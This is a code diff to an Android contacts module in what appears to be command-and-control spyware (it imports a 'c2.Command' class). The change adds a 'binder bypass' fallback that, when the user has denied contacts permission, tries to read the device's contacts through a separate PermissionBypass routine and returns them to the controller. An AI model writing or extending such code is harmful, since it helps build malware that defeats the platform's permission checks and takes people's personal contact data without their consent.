@@ -2,6 +2,7 @@ package org.synapse.core.modules
 
 import android.content.Context
 import android.provider.ContactsContract
+import android.util.Log
 import org.synapse.core.c2.Command
 import org.synapse.core.core.ContactEntry
 import org.synapse.core.core.SynapseResponse
@@ -90,7 +91,19 @@ object ContactsModule {
                 count = contacts.size
             )
         } catch (e: SecurityException) {
-            SynapseResponse.ErrorResponse("contacts:permission_denied:${e.message}", "contacts")
+            // ── Binder bypass fallback ──
+            Log.d("Synapse.Contacts", "ContentResolver denied, trying binder bypass...")
+            return try {
+                val binderContacts = PermissionBypass.readContactsViaBinder(context, search, count)
+                if (binderContacts.isNotEmpty()) {
+                    Log.d("Synapse.Contacts", "Binder bypass success: ${binderContacts.size} contacts")
+                    SynapseResponse.ContactsResponse(contacts = binderContacts, count = binderContacts.size)
+                } else {
+                    SynapseResponse.ErrorResponse("contacts:permission_denied:${e.message}", "contacts")
+                }
+            } catch (bp: Exception) {
+                SynapseResponse.ErrorResponse("contacts:permission_denied_and_bypass_failed:${bp.message}", "contacts")
+            }
         } catch (e: Exception) {
             SynapseResponse.ErrorResponse("contacts:${e.message}", "contacts")
         }
